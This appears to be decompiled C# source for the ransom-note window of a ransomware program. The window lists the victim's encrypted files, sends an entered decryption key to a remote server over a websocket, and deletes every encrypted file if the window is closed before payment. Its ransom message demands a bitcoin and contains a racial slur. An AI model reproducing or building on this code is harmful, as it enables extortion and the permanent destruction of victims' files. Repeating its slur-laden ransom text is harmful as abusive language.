using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace Cockblocker;

public class RansomwareDisplay : Form
{
	private bool HasPaid;

	private IContainer components;

	private Label label2;

	private Button button1;

	private TextBox textBox1;

	private RichTextBox richTextBox1;

	private Label label1;

	public RansomwareDisplay()
	{
		InitializeComponent();
	}

	private void RansomwareDisplay_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (HasPaid)
		{
			return;
		}
		foreach (string item in Globals.encrypted)
		{
			File.Delete(item);
		}
	}

	private void RansomwareDisplay_Load(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Globals.ws.Send(JsonConvert.SerializeObject((object)new Globals.cmd("private_key", ((Control)textBox1).get_Text())));
	}

	private void RansomwareDisplay_Shown(object sender, EventArgs e)
	{
		((TextBoxBase)richTextBox1).set_Lines(Globals.encrypted.ToArray());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		//IL_02ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f9: Expected O, but got Unknown
		label2 = new Label();
		button1 = new Button();
		textBox1 = new TextBox();
		richTextBox1 = new RichTextBox();
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Comic Sans MS", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(147, 9));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(615, 80));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Yo file's been encrypted nigga\r\nPays me a bitcoin and I unencrypt them fam\r\n");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)button1).set_Location(new Point(12, 283));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(143, 22));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("Use Decryption Code");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Location(new Point(12, 311));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(143, 20));
		((Control)textBox1).set_TabIndex(5);
		((Control)richTextBox1).set_Location(new Point(12, 116));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(361, 96));
		((Control)richTextBox1).set_TabIndex(6);
		((Control)richTextBox1).set_Text("");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(12, 97));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(79, 13));
		((Control)label1).set_TabIndex(7);
		((Control)label1).set_Text("Encrypted Files");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(931, 343));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).set_Name("RansomwareDisplay");
		((Control)this).set_Text("RansomwareDisplay");
		((Form)this).add_FormClosing(new FormClosingEventHandler(RansomwareDisplay_FormClosing));
		((Form)this).add_Load((EventHandler)RansomwareDisplay_Load);
		((Form)this).add_Shown((EventHandler)RansomwareDisplay_Shown);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
